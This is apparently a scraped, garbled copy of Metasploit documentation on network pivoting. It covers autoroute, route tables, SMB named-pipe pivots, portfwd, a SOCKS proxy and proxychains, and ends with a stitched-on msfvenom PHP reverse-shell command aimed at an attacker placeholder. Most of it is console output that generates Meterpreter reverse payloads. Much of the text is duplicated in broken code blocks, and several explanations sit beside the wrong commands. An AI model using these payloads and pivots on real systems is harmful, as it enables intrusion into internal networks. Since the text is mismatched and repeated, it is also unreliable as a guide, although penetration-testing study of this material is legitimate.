## Overview
## Supported Session Types
## Testing Pivoting
### Target Environment Setup
## AutoRoute
One of the easiest ways to do this is to use the `post/multi/manage/autoroute` module which will help us automatically add in routes for the target to Metasploit's routing table so that Metasploit knows how to route traffic through the session that we have on the Windows 11 box and to the target Windows Server 2019 box. Lets look at a sample run of this command:
```msf
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, auto
                                       add, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 169.254.0.0
SUBNET => 169.254.0.0
msf6 post(multi/manage/autoroute) > set NETMASK /16
NETMASK => /16
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, auto
                                       add, print, delete, default)
   NETMASK  /16              no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  1                yes       The session to run this module on
   SUBNET   169.254.0.0      no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against WIN11-TEST
[*] Searching for subnets to autoroute.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.19.176.0/255.255.240.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) >
```

If we now use Meterpreter's `route` command we can see that we have two route table entries within Metasploit's routing table, that are tied to Session 1, aka the session on the Windows 11 machine. This means anytime we want to contact a machine within one of the networks specified, we will go through Session 1 and use that to connect to the targets.
```msf
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1
   172.19.176.0       255.255.240.0      Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
```

All right so that's one way, but what if we wanted to do this manually? First off to flush all routes from the routing table, we will do `route flush` followed by `route` to double check we have successfully removed the entries.
```msf
msf6 post(multi/manage/autoroute) > route flush
msf6 post(multi/manage/autoroute) > route
[*] There are currently no routes defined.
msf6 post(multi/manage/autoroute) >
```

## Route
Here we can use `route add <IP ADDRESS OF SUBNET> <NETMASK> <GATEWAY>` to add the routes from within Metasploit, followed by `route print` to then print all the routes that Metasploit knows about. Note that the Gateway parameter is either an IP address to use as the gateway or as is more commonly the case, the session ID of an existing session to use to pivot the traffic through.
```msf
msf6 post(multi/manage/autoroute) > route add 169.254.0.0 255.255.0.0 1
[*] Route added
msf6 post(multi/manage/autoroute) > route add 172.19.176.0 255.255.240 1
[-] Invalid gateway
msf6 post(multi/manage/autoroute) > route add 172.19.176.0 255.255.240.0 1
[*] Route added
msf6 post(multi/manage/autoroute) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1
   172.19.176.0       255.255.240.0      Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
```

Finally we can check that the route will use session 1 by using `route get 169.254.204.110`
```msf
msf6 post(multi/manage/autoroute) > route get 169.254.204.110
169.254.204.110 routes through: Session 1
msf6 post(multi/manage/autoroute) >
```

Example:
```msf
msf6 post(multi/manage/autoroute) > route remove 172.19.176.0/20 1
[*] Route removed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
```

## Using the Pivot
At this point we can now use the pivot with any Metasploit modules as shown below:
```msf
msf6 > use payload/windows/x64/meterpreter/reverse_tcp
smsf6 payload(windows/x64/meterpreter/reverse_tcp) > set lhost 172.19.182.171
lhost => 172.19.182.171
msf6 payload(windows/x64/meterpreter/reverse_tcp) > set lport 4578
lport => 4578
msf6 payload(windows/x64/meterpreter/reverse_tcp) > to_handler
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 172.19.182.171:4578 
msf6 payload(windows/x64/meterpreter/reverse_tcp) > [*] Sending stage (200774 bytes) to 172.19.185.34
[*] Meterpreter session 1 opened (172.19.182.171:4578 -> 172.19.185.34:49674) at 2022-06-09 13:23:03 -0500
```

## SMB Named Pipe Pivoting in Meterpreter
First open a Windows Meterpreter session to the pivot machine:
```msf
msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > pivot add -t pipe -l 169.254.16.221 -n msf-pipe -a x64 -p windows
[+] Successfully created pipe pivot.
meterpreter > background
[*] Backgrounding session 1...
```

Create named pipe pivot listener on the pivot machine, setting `-l` to the pivot's bind address:
```msf
msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > show options

Module options (payload/windows/x64/meterpreter/reverse_named_pipe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   PIPEHOST  .                yes       Host of the pipe to connect to
   PIPENAME  msf-pipe         yes       Name of the pipe to listen on

msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > set pipehost 169.254.16.221
pipehost => 169.254.16.221
msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > generate -f exe -o revpipe_meterpreter_msfpipe.exe
[*] Writing 7168 bytes to revpipe_meterpreter_msfpipe.exe...
```

Now generate a separate payload that will connect back through the pivot machine. This payload will be executed on the final target machine.  Note there is no need to start a handler for the named pipe payload.
```msf
msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > [*] Meterpreter session 2 opened (Pivot via [172.19.182.171:4578 -> 169.254.16.221:49674]) at 2022-06-09 13:34:32 -0500

msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                Connection
  --  ----  ----                     -----------                                ----------
  1         meterpreter x64/windows  WIN11\msfuser @ WIN11          172.19.182.171:4578 -> 172.19.185.34:49674 (172.19.185.34)
  2         meterpreter x64/windows  WIN2019\msfuser @ WIN2019      Pivot via [172.19.182.171:4578 -> 172.19.185.34:49674]
                                                                                 (169.254.204.110)

```

After running the payload on the final target machine a new session will open, via the Windows 11 169.254.16.221 pivot.
```msf
meterpreter > portfwd add -l 1090 -p 443 -r 169.254.37.128
[*] Local TCP relay created: :1090 <-> 169.254.37.128:443
meterpreter >
```

## Pivoting External Tools
### portfwd
#### Local Port Forwarding
To set up a port forward using Metasploit, use the `portfwd` command within a supported session's console such as the Meterpreter console. Using `portfwd -h` will bring up a help menu similar to the following:
```msf
meterpreter > portfwd delete -l 1090
[*] Successfully stopped TCP relay on 0.0.0.0:1090
meterpreter > portfwd list

No port forwards are currently active.

meterpreter >
```

To add a port forward, use `portfwd add` and specify the `-l`, `-p` and `-r` options at a minimum to specify the local port to listen on, the report port to connect to, and the target host to connect to respectively.
```msf
meterpreter > portfwd add -R -l 4444 -L 172.20.97.73 -p 9093
[*] Local TCP relay created: 172.20.97.73:4444 <-> :9093
meterpreter > netstat -a

Connection list
===============

    Proto  Local addre  Remote addr  State        User  Inode  PID/Program name
           ss           ess
    -----  -----------  -----------  -----        ----  -----  ----------------
    tcp    0.0.0.0:135  0.0.0.0:*    LISTEN       0     0      488/svchost.exe
    tcp    0.0.0.0:445  0.0.0.0:*    LISTEN       0     0      4/System
    tcp    0.0.0.0:504  0.0.0.0:*    LISTEN       0     0      5780/svchost.exe
           0
    tcp    0.0.0.0:909  0.0.0.0:*    LISTEN       0     0      2116/bind_tcp_x64_4444.exe
           3
```

We can then connect to the target host using the local port on the machine running Metasploit:
```msf
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on.
                                         This must be an address on the local machine or
                                        0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
SRVPORT => 1080
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) >
[*] Starting the SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

msf6 auxiliary(server/socks_proxy) >
```

#### Listing Port Forwards and Removing Entries
Can list port forwards using the `portfwd list` command. To delete all port forwards use `portfwd flush`. Alternatively to selectively delete local port forwarding entries, use `portfwd delete -l <local port>`.
```ini
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080
#
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

`msf
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, auto
                                       add, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 169.254.0.0
SUBNET => 169.254.0.0
msf6 post(multi/manage/autoroute) > set NETMASK /16
NETMASK => /16
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, auto
                                       add, print, delete, default)
   NETMASK  /16              no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  1                yes       The session to run this module on
   SUBNET   169.254.0.0      no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against WIN11-TEST
[*] Searching for subnets to autoroute.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.19.176.0/255.255.240.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) >
`

`msf
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1
   172.19.176.0       255.255.240.0      Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
`

`msf
msf6 post(multi/manage/autoroute) > route flush
msf6 post(multi/manage/autoroute) > route
[*] There are currently no routes defined.
msf6 post(multi/manage/autoroute) >
`

`msf
msf6 post(multi/manage/autoroute) > route add 169.254.0.0 255.255.0.0 1
[*] Route added
msf6 post(multi/manage/autoroute) > route add 172.19.176.0 255.255.240 1
[-] Invalid gateway
msf6 post(multi/manage/autoroute) > route add 172.19.176.0 255.255.240.0 1
[*] Route added
msf6 post(multi/manage/autoroute) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1
   172.19.176.0       255.255.240.0      Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
`

`msf
msf6 post(multi/manage/autoroute) > route get 169.254.204.110
169.254.204.110 routes through: Session 1
msf6 post(multi/manage/autoroute) >
`

`msf
msf6 post(multi/manage/autoroute) > route remove 172.19.176.0/20 1
[*] Route removed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) >
`

`msf
msf6 > use payload/windows/x64/meterpreter/reverse_tcp
smsf6 payload(windows/x64/meterpreter/reverse_tcp) > set lhost 172.19.182.171
lhost => 172.19.182.171
msf6 payload(windows/x64/meterpreter/reverse_tcp) > set lport 4578
lport => 4578
msf6 payload(windows/x64/meterpreter/reverse_tcp) > to_handler
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 172.19.182.171:4578 
msf6 payload(windows/x64/meterpreter/reverse_tcp) > [*] Sending stage (200774 bytes) to 172.19.185.34
[*] Meterpreter session 1 opened (172.19.182.171:4578 -> 172.19.185.34:49674) at 2022-06-09 13:23:03 -0500
`

`msf
msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > pivot add -t pipe -l 169.254.16.221 -n msf-pipe -a x64 -p windows
[+] Successfully created pipe pivot.
meterpreter > background
[*] Backgrounding session 1...
`

`msf
msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > show options

Module options (payload/windows/x64/meterpreter/reverse_named_pipe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   PIPEHOST  .                yes       Host of the pipe to connect to
   PIPENAME  msf-pipe         yes       Name of the pipe to listen on

msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > set pipehost 169.254.16.221
pipehost => 169.254.16.221
msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > generate -f exe -o revpipe_meterpreter_msfpipe.exe
[*] Writing 7168 bytes to revpipe_meterpreter_msfpipe.exe...
`

`msf
msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > [*] Meterpreter session 2 opened (Pivot via [172.19.182.171:4578 -> 169.254.16.221:49674]) at 2022-06-09 13:34:32 -0500

msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                Connection
  --  ----  ----                     -----------                                ----------
  1         meterpreter x64/windows  WIN11\msfuser @ WIN11          172.19.182.171:4578 -> 172.19.185.34:49674 (172.19.185.34)
  2         meterpreter x64/windows  WIN2019\msfuser @ WIN2019      Pivot via [172.19.182.171:4578 -> 172.19.185.34:49674]
                                                                                 (169.254.204.110)

`

`
## Pivoting External Tools

### portfwd
*Note: This method is discouraged as you can only set up a mapping between a single port and another target host and port, so using the socks module below is encouraged where possible. Additionally this method has been depreciated for some time now.*

#### Local Port Forwarding
To set up a port forward using Metasploit, use the `

`msf
meterpreter > portfwd add -l 1090 -p 443 -r 169.254.37.128
[*] Local TCP relay created: :1090 <-> 169.254.37.128:443
meterpreter >
`

`msf
meterpreter > portfwd delete -l 1090
[*] Successfully stopped TCP relay on 0.0.0.0:1090
meterpreter > portfwd list

No port forwards are currently active.

meterpreter >
`

`msf
meterpreter > portfwd add -R -l 4444 -L 172.20.97.73 -p 9093
[*] Local TCP relay created: 172.20.97.73:4444 <-> :9093
meterpreter > netstat -a

Connection list
===============

    Proto  Local addre  Remote addr  State        User  Inode  PID/Program name
           ss           ess
    -----  -----------  -----------  -----        ----  -----  ----------------
    tcp    0.0.0.0:135  0.0.0.0:*    LISTEN       0     0      488/svchost.exe
    tcp    0.0.0.0:445  0.0.0.0:*    LISTEN       0     0      4/System
    tcp    0.0.0.0:504  0.0.0.0:*    LISTEN       0     0      5780/svchost.exe
           0
    tcp    0.0.0.0:909  0.0.0.0:*    LISTEN       0     0      2116/bind_tcp_x64_4444.exe
           3
`

`msf
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on.
                                         This must be an address on the local machine or
                                        0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
SRVPORT => 1080
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) >
[*] Starting the SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

msf6 auxiliary(server/socks_proxy) >
`

`ini
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080
#
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
`
### Creating a PHP Reverse Shell with msfvenom
This command generates a raw PHP reverse shell payload using msfvenom. By specifying the local host (LHOST) and local port (LPORT) where the attacker is listening, this payload will create a reverse connection back to the attacker's machine. The generated shell will be saved in a file named reverse_shell.php, which can be deployed on a vulnerable web server to establish a shell session with the attacker.

```bash
msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > reverse_shell.php
```
